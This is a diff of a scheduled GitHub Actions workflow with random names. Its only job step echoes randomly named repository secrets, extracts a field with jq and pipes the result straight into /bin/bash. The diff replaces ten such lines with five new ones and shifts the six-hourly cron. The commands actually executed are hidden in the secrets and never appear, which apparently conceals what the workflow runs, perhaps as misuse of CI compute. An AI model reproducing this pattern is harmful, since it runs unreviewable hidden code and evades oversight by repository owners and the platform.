@@ -3,8 +3,9 @@ name: wujianxiong7651
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 0/6 * * *'
-jobs:  # 29390
+    - cron: '25 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +13,11 @@ jobs:  # 29390
       - uses: actions/checkout@v4
       - name: wujianxiong7651
         env:
-          clk596: ${{ secrets.clk596 }}
+          vanl3030: ${{ secrets.vanl3030 }}
         run: |
-          echo $clk596 | jq -r .nnkd501 | /bin/bash
-          echo $cuaod177 | jq -r .cp3783 | /bin/bash
-          echo $wm787 | jq -r .un5730 | /bin/bash
-          echo $uwbp61840 | jq -r .zgyv71 | /bin/bash
-          echo $ttmdh55 | jq -r .y806 | /bin/bash
-          echo $dpveo590 | jq -r .bs8 | /bin/bash
-          echo $owdl3988 | jq -r .p33951 | /bin/bash
-          echo $ygbtf13248 | jq -r .gx92 | /bin/bash
-          echo $bm6558 | jq -r .x17 | /bin/bash
-          echo $c6 | jq -r .q1 | /bin/bash
+          echo $vanl3030 | jq -r .ryr06 | /bin/bash
+          echo $df075 | jq -r .bqbv4467 | /bin/bash
+          echo $ycr10749 | jq -r .zzigg63 | /bin/bash
+          echo $w6 | jq -r .vyruv657 | /bin/bash
+          echo $w138 | jq -r .zgfj28 | /bin/bash
 
